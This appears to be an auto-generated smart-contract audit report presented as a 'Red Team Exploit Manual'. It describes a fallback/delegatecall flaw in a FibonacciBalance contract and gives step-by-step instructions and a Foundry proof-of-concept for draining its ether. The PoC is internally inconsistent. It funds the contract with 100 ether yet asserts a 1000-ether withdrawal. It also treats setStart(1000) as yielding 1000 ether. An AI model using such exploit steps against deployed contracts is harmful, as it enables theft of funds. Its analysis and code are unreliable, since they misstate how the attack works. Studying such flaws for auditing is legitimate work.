# Red Team Exploit Manual
## 🔥 Severity & Impact:
The identified vulnerability is Critical due to the potential for an attacker to drain the contract's funds. The fallback function in the `FibonacciBalance` contract allows users to call any function in the `FibonacciLib` contract, including `setStart`, which can be used to manipulate the `calculatedFibNumber`. An attacker can exploit this vulnerability to set the `calculatedFibNumber` to a large value, allowing them to withdraw a significant amount of ether from the contract.

## ⚔️ The Attack Scenario (Step-by-Step):
1. **Deploy the contracts**: Deploy the `FibonacciBalance` and `FibonacciLib` contracts on the Ethereum network.
2. **Identify the contract addresses**: Note the addresses of the deployed contracts.
3. **Call the fallback function**: Call the fallback function in the `FibonacciBalance` contract, passing the `setStart` function selector and a large value as arguments.
4. **Manipulate the calculatedFibNumber**: The `setStart` function will set the `start` variable in the `FibonacciLib` contract to the specified value, which will be used to calculate the `calculatedFibNumber`.
5. **Call the withdraw function**: Call the `withdraw` function in the `FibonacciBalance` contract to withdraw the manipulated `calculatedFibNumber` amount of ether.
6. **Repeat the process**: Repeat steps 3-5 to drain the contract's funds.

## 💻 Proof of Concept (Foundry Code):
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract TestExploit is Test {
    FibonacciBalance public fibonacciBalance;
    FibonacciLib public fibonacciLib;

    function setUp() public {
        fibonacciLib = new FibonacciLib();
        fibonacciBalance = new FibonacciBalance(address(fibonacciLib));
        payable(address(fibonacciBalance)).transfer(100 ether);
    }

    function testExploit() public {
        // Set the start value to a large number
        bytes memory data = abi.encodeWithSelector(FibonacciLib.setStart.selector, 1000);
        (bool success, ) = address(fibonacciBalance).call(data);
        assertEq(success, true);

        // Call the withdraw function
        uint256 initialBalance = address(this).balance;
        fibonacciBalance.withdraw();
        assertEq(address(this).balance, initialBalance + 1000 ether);
    }
}
```
Note: This code uses the Foundry testing framework to deploy the contracts, exploit the vulnerability, and assert that the exploit was successful. The `testExploit` function sets the `start` value to a large number, calls the `withdraw` function, and asserts that the balance of the test contract has increased by the expected amount.